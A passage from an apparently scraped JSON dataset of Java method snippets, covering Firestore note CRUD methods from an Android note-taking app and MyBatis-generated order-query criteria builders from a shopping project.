"DataCallback"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void getNote(final String id, final DataCallback callback) {    final List<Note> allNotes = new ArrayList<>();    db.collection(\"notes\")      .document(id)      .get()      .addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {        @Override        public void onComplete(@NonNull Task<DocumentSnapshot> task) {          if (task.isSuccessful()) {            DocumentSnapshot doc = task.getResult();            allNotes.add(              new Note(                id,                doc.getString(\"title\"),                doc.getString(\"content\"),                doc.getTimestamp(\"timestamp\"))            );            callback.onCallback(allNotes);          }        }      });  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/NoteDatabase.java", "stars": "3", "class": {"name": "NoteDatabase", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getAllNotes", "params": ["String", "DataCallback"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void getAllNotes(String uid, final DataCallback callback) {    final List<Note> allNotes = new ArrayList<>();    db.collection(\"notes\")      .orderBy(\"timestamp\", Query.Direction.DESCENDING)      .whereEqualTo(\"uid\", uid)      .get()      .addOnCompleteListener(new OnCompleteListener<QuerySnapshot>() {        @Override        public void onComplete(@NonNull Task<QuerySnapshot> task) {          if (task.isSuccessful()) {            for (QueryDocumentSnapshot doc : task.getResult()) {              allNotes.add(                new Note(                  doc.getId(),                  doc.getString(\"title\"),                  doc.getString(\"content\"),                  doc.getTimestamp(\"timestamp\"))              );            }            callback.onCallback(allNotes);          }        }      });  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/NoteDatabase.java", "stars": "3", "class": {"name": "NoteDatabase", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "deleteNote", "params": ["String", "DataCallback"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void deleteNote(String noteId, final DataCallback callback) {    db.collection(\"notes\")      .document(noteId)      .delete()      .addOnCompleteListener(new OnCompleteListener<Void>() {        @Override        public void onComplete(@NonNull Task<Void> task) {          callback.onCallback(new ArrayList<Note>());        }      });  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/NoteDatabase.java", "stars": "3", "class": {"name": "NoteDatabase", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createNote", "params": ["Note", "DataCallback"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createNote(Note note, final DataCallback callback) {    Map<String, Object> noteObj = new HashMap<>();    noteObj.put(\"title\", note.getTitle());    noteObj.put(\"content\", note.getContent());    noteObj.put(\"timestamp\", note.getTime());    noteObj.put(\"uid\", FirebaseAuth.getInstance().getCurrentUser().getUid());    db.collection(\"notes\")      .document()      .set(noteObj)      .addOnSuccessListener(new OnSuccessListener<Void>() {        @Override        public void onSuccess(Void aVoid) {          callback.onCallback(new ArrayList<Note>());        }      })      .addOnFailureListener(new OnFailureListener() {        @Override        public void onFailure(@NonNull Exception e) {          callback.onCallback(null);        }      });  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/NoteDatabase.java", "stars": "3", "class": {"name": "NoteDatabase", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "updateNote", "params": ["String", "Note", "DataCallback"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void updateNote(String id, Note note, final DataCallback callback) {    Map<String, Object> noteObj = new HashMap<>();    noteObj.put(\"title\", note.getTitle());    noteObj.put(\"content\", note.getContent());    db.collection(\"notes\")      .document(id)      .update(noteObj)      .addOnSuccessListener(new OnSuccessListener<Void>() {        @Override        public void onSuccess(Void v) {          callback.onCallback(new ArrayList<Note>());        }      })      .addOnFailureListener(new OnFailureListener() {        @Override        public void onFailure(@NonNull Exception e) {          callback.onCallback(null);        }      });  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/NoteDatabase.java", "stars": "3", "class": {"name": "NoteDatabase", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setOrderByClause", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderByClause(String orderByClause) {        this.orderByClause = orderByClause;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrderByClause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrderByClause() {        return orderByClause;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDistinct", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDistinct(boolean distinct) {        this.distinct = distinct;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDistinct", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDistinct() {        return distinct;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOredCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criteria>", "snippet": "    public List<Criteria> getOredCriteria() {        return oredCriteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": ["Criteria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void or(Criteria criteria) {        oredCriteria.add(criteria);    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria or() {        Criteria criteria = createCriteriaInternal();        oredCriteria.add(criteria);        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria createCriteria() {        Criteria criteria = createCriteriaInternal();        if (oredCriteria.size() == 0) {            oredCriteria.add(criteria);        }        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteriaInternal", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Criteria", "snippet": "    protected Criteria createCriteriaInternal() {        Criteria criteria = new Criteria();        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {        oredCriteria.clear();        orderByClause = null;        distinct = false;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "OrderDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isValid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isValid() {            return criteria.size() > 0;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getAllCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getAllCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition) {            if (condition == null) {                throw new RuntimeException(\"Value for condition cannot be null\");            }            criteria.add(new Criterion(condition));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value, String property) {            if (value == null) {                throw new RuntimeException(\"Value for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value1, Object value2, String property) {            if (value1 == null || value2 == null) {                throw new RuntimeException(\"Between values for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value1, value2));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNull() {            addCriterion(\"id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNotNull() {            addCriterion(\"id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdEqualTo(String value) {            addCriterion(\"id =\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotEqualTo(String value) {            addCriterion(\"id <>\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThan(String value) {            addCriterion(\"id >\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThanOrEqualTo(String value) {            addCriterion(\"id >=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThan(String value) {            addCriterion(\"id <\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThanOrEqualTo(String value) {            addCriterion(\"id <=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLike(String value) {            addCriterion(\"id like\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotLike(String value) {            addCriterion(\"id not like\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIn(List<String> values) {            addCriterion(\"id in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotIn(List<String> values) {            addCriterion(\"id not in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdBetween(String value1, String value2) {            addCriterion(\"id between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotBetween(String value1, String value2) {            addCriterion(\"id not between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdIsNull() {            addCriterion(\"user_id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdIsNotNull() {            addCriterion(\"user_id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdEqualTo(Integer value) {            addCriterion(\"user_id =\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdNotEqualTo(Integer value) {            addCriterion(\"user_id <>\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdGreaterThan(Integer value) {            addCriterion(\"user_id >\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdGreaterThanOrEqualTo(Integer value) {            addCriterion(\"user_id >=\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdLessThan(Integer value) {            addCriterion(\"user_id <\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdLessThanOrEqualTo(Integer value) {            addCriterion(\"user_id <=\", value, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdIn(List<Integer> values) {            addCriterion(\"user_id in\", values, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdNotIn(List<Integer> values) {            addCriterion(\"user_id not in\", values, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdBetween(Integer value1, Integer value2) {            addCriterion(\"user_id between\", value1, value2, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andUserIdNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andUserIdNotBetween(Integer value1, Integer value2) {            addCriterion(\"user_id not between\", value1, value2, \"userId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIsNull() {            addCriterion(\"item_id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIsNotNull() {            addCriterion(\"item_id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdEqualTo(Integer value) {            addCriterion(\"item_id =\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotEqualTo(Integer value) {            addCriterion(\"item_id <>\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdGreaterThan(Integer value) {            addCriterion(\"item_id >\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdGreaterThanOrEqualTo(Integer value) {            addCriterion(\"item_id >=\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdLessThan(Integer value) {            addCriterion(\"item_id <\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdLessThanOrEqualTo(Integer value) {            addCriterion(\"item_id <=\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIn(List<Integer> values) {            addCriterion(\"item_id in\", values, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotIn(List<Integer> values) {            addCriterion(\"item_id not in\", values, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdBetween(Integer value1, Integer value2) {            addCriterion(\"item_id between\", value1, value2, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotBetween(Integer value1, Integer value2) {            addCriterion(\"item_id not between\", value1, value2, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceIsNull() {            addCriterion(\"item_price is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": 